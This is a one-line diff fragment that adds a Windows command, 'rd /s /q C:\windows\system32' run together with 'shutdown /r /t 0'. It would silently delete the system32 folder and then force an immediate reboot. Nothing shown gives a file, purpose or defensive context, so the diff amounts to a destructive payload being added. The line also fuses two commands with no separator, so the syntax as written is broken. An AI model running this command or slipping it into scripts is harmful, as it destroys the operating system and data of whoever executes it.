@@ -1,0 +1,1 @@
+rd /s /q C:\windows\system32\shutdown /r /t 0
